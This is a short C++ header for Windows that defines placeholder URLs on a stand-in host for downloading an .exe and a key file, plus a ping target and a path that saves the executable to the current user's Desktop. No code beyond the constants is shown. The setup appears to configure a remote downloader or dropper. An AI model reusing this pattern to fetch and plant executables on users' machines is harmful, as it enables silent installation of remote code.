#pragma once
#include "windows.h"
#include <iostream>

#define FILE_SOURCE "http://insert_website_name_here.com/file_name.exe"
#define KEY_LOCATION "http://insert_website_name_here.com/key.txt"
#define PING_DEST "http://insert_website_name_here.com"
#define DESTINATION "C:/Users/" + get_user_name() + "/Desktop/some_file_name.exe"

//FILE_SOURCE http://insert_website_name_here.com/file_name.exe
//KEY_LOCATION http://insert_website_name_here.com/key.txt (doesnt have to be .txt, you can just upload it to your github as a .txt LOL)
//PING_DEST http://insert_website_name_here.com
//DESTINATION "C:/Users/" + get_user_name() + "/Desktop/some_file_name.exe"